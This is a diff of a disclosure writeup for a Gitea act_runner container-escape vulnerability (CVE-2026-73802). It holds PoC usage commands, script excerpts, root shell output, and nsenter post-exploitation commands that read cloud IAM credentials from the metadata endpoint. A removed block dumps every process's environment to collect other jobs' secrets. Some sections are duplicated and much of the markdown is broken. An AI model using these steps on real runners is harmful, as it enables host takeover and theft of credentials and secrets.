@@ -41,7 +41,7 @@ This writeup covers CVE-2026-73802, a Critical severity sandbox escape vulnerabi
 
 This writeup covers CVE-2026-73802, a Critical severity sandbox escape in Gitea's `` `act_runner` the component responsible for executing Gitea Actions workflows. The vulnerability allows any workflow author to break out of the job container and execute arbitrary commands as root on the runner host, even when the runner operator has explicitly disabled privileged mode ``.
 
-**CVE:** CVE-2026-73802 **CVSS:** 9.9 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) **Affected:** Gitea act\_runner < 3.0.0 **Fixed:** act\_runner 3.0.0 **Reporter:** sn0x-sharma (Sanket Sharma) **Advisory:** GHSA-x4q3-gcj3-m6cf
+**CVE:** CVE-2026-73802 **CVSS:** 9.9 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) **Affected:** Gitea act\_runner < 3.0.0 **Fixed:** act\_runner 3.0.0 **Reporter:** sn0x-sharma **Advisory:** GHSA-x4q3-gcj3-m6cf
 
 ### Understanding the Components
 
@@ -96,11 +96,6 @@ It operates in two modes:
 
 * **Direct mode:** Commands run directly on the host machine
 * **Docker mode:** Each job runs in an isolated Docker container (the secure approach)
-
-Two modes mein kaam karta hai:
-
-* **Direct mode:** Commands directly host machine pe run hoti hain
-* **Docker mode:** Har job ek isolated Docker container mein run hoti hai (secure approach)
 
 #### Docker-backed Runners and the Privilege Model
 
@@ -380,22 +375,22 @@ Runner Host Machine
 
 ### PoC Script Walkthrough
 
-The proof-of-concept `poc.py` is a self-contained Python script (standard library only) that automates the full exploit chain: it generates a malicious workflow, executes it through `act_runner exec`, and verifies that a marker file was created on the **host** filesystem — confirming the container escape succeeded.
+The proof-of-concept `gitea_act_runner_escape.py` is a self-contained Python script (standard library only) that automates the full exploit chain: it generates a malicious workflow, executes it through `act_runner exec`, and verifies that a marker file was created on the **host** filesystem — confirming the container escape succeeded.
 
 #### Usage
 
 ```bash
 # Basic run
-python3 poc.py --runner ./act_runner --image ubuntu:22.04
+python3 gitea_act_runner_escape.py --runner ./act_runner --image ubuntu:22.04
 
 # Verbose output with act_runner debug logs
-python3 poc.py --runner ./act_runner --image ubuntu:22.04 --debug
+python3 gitea_act_runner_escape.py --runner ./act_runner --image ubuntu:22.04 --debug
 
 # Inspect the generated workflow after the run
-python3 poc.py --runner ./act_runner --keep-workdir --debug
+python3 gitea_act_runner_escape.py --runner ./act_runner --keep-workdir --debug
 ```
 
-#### How the Script Works — Step by Step
+#### How the Script Works - Step by Step
 
 **1. Input validation (`validate_marker`)**
 
@@ -465,21 +460,21 @@ gitea-act-runner-container-options-poc-ok
 
 #### Why the Docker Socket is Disabled
 
-This is the most important design decision in the PoC. Docker socket access (`/var/run/docker.sock`) is a well-known, separate escape vector — if a container can reach the Docker socket, it can spawn privileged containers and escape trivially. By disabling it with `--container-daemon-socket=-`, the PoC proves that the escape happens **exclusively** through the `container.options` namespace passthrough bug. The root cause is in `sanitizeConfig()` leaving `PidMode`, `IpcMode`, `CapAdd`, and `SecurityOpt` fields unfiltered — nothing else.
+This is the most important design decision in the PoC. Docker socket access (`/var/run/docker.sock`) is a well-known, separate escape vector if a container can reach the Docker socket, it can spawn privileged containers and escape trivially. By disabling it with `--container-daemon-socket=-`, the PoC proves that the escape happens **exclusively** through the `container.options` namespace passthrough bug. The root cause is in `sanitizeConfig()` leaving `PidMode`, `IpcMode`, `CapAdd`, and `SecurityOpt` fields unfiltered nothing else.
 
-``The PoC `poc.py` is a stdlib-only Python script that automatically generates a malicious workflow, runs it via `act_runner exec`, and verifies that a marker file was created on the host — confirming the escape succeeded``.
+`The PoC`` ``` `gitea_act_runner_escape.py` is a stdlib-only Python script that automatically generates a malicious workflow, runs it via `act_runner exec`, and verifies that a marker file was created on the host — confirming the escape succeeded ``.
 
 #### Usage
 
 ```bash
 # Basic run
-python3 poc.py --runner ./act_runner --image ubuntu:22.04
+python3 gitea_act_runner_escape.py --runner ./act_runner --image ubuntu:22.04
 
 # Verbose output with debug
-python3 poc.py --runner ./act_runner --image ubuntu:22.04 --debug
+python3 gitea_act_runner_escape.py --runner ./act_runner --image ubuntu:22.04 --debug
 
 # Workflow directory inspect karne ke liye
-python3 poc.py --runner ./act_runner --keep-workdir --debug
+python3 gitea_act_runner_escape.py --runner ./act_runner --keep-workdir --debug
 ```
 
 #### Script ka Flow - Step by Step
@@ -494,7 +489,7 @@ def validate_marker(marker):
         raise SystemExit("marker contains unsupported characters")
 ```
 
-`` The marker path is validated — only safe characters are allowed. Default: `/tmp/gitea_act_runner_container_options_poc_marker` ``
+`` The marker path is validated only safe characters are allowed. Default: `/tmp/gitea_act_runner_container_options_poc_marker` ``
 
 **2. Workflow generation (`write_workflow`)**
 
@@ -523,10 +518,7 @@ cmd = [
 ]
 ```
 
-``**`--container-daemon-socket=-` disables the Docker socket bind mount into the job container. This is intentional it rules out Docker socket abuse as the escape vector and proves the bug lives purely in namespace passthrough.``\*\*
-
-* Agar Docker socket available hota toh koi argue kar sakta tha ki escape Docker socket se hua
-* Socket disabled karne ke baad bhi escape hota hai → **confirms bug is in namespace handling, not socket**
+`` `--container-daemon-socket=-` disables the Docker socket bind mount into the job container. This is intentional it rules out Docker socket abuse as the escape vector and proves the bug lives purely in namespace passthrough. ``
 
 **4. Marker verification (`read_marker`)**
 
@@ -555,7 +547,7 @@ uid=0(root) gid=0(root) groups=0(root)
 gitea-act-runner-container-options-poc-ok
 ```
 
-#### Key Design Decision — `--container-daemon-socket=-`
+#### Key Design Decision  `--container-daemon-socket=-`
 
 ``This flag disables Docker socket access inside the job container — a separate, well-known attack vector (Docker-in-Docker). The PoC's purpose is specifically to demonstrate the `container.options` namespace passthrough bug. The escape still works with the socket disabled, which proves the root cause is in HostConfig option handling alone``.
 
@@ -565,7 +557,7 @@ gitea-act-runner-container-options-poc-ok
 
 **Critical severity Shared runners:** Any Gitea instance where multiple users or teams submit workflows to a shared Docker-backed runner. This is the default deployment model for self-hosted Gitea with open or semi-open registration, and for internal company instances where engineering teams share a common runner pool.
 
-**High severity — Single-tenant runners:** Even private runners serving a single repository, where the operator set `privileged: false` believing the container was isolated. The attacker in this scenario may be the repository owner themselves — demonstrating that the security assumption of `privileged: false` is simply wrong without additional filtering.
+**High severity Single-tenant runners:** Even private runners serving a single repository, where the operator set `privileged: false` believing the container was isolated. The attacker in this scenario may be the repository owner themselves demonstrating that the security assumption of `privileged: false` is simply wrong without additional filtering.
 
 #### What an Attacker Can Access
 
@@ -614,9 +606,9 @@ nsenter -t 1 -m -u -i -n -p -- sh -c "
 
 #### Who is Affected?
 
-**\*\*Critical severity — Shared runners:\*\* Any Gitea instance where multiple users run workflows on a shared Docker runner. This includes self-hosted Gitea with open registration and internal company instances where teams share a singl**e runner.
+**Critical severity Shared runners:Any Gitea instance where multiple users run workflows on a shared Docker runner. This includes self-hosted Gitea with open registration and internal company instances where teams share a singl**e runner.
 
-\*\*``**High severity — Single-tenant runners:** Even private single-user runners where the admin set `privileged: false` believing the container was sandboxed. The attacker here is the repository owner themselves — breaking the security assumption of their own runner**``.
+``High severity Single-tenant runners:** Even private single-user runners where the admin set `privileged: false` believing the container was sandboxed. The attacker here is the repository owner themselves breaking the security assumption of their own runner``.
 
 #### What an Attacker Gets
 
@@ -643,19 +635,5 @@ If the runner is on a cloud instance (AWS EC2, GCP, Azure):
 nsenter -t 1 -m -u -i -n -p -- sh -c "
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
 "
-# → AWS IAM role credentials milte hain → full cloud account access
+# → AWS IAM role credentials → full cloud account access
 ```
-
-#### Job Secret Theft
-
-```bash
-# Saare running processes ke environment variables dump karo
-nsenter -t 1 -m -u -i -n -p -- sh -c "
-  for pid in /proc/[0-9]*; do
-    cat $pid/environ 2>/dev/null | tr '\0' '\n'
-  done
-"
-# Output mein doosre jobs ke secrets bhi hote hain
-```
-
-_\*Disclosure was handled responsibly the Gitea team was notified before public release and shipped the fix in act\_runner 3.0.0 before the advisory was published.\*_
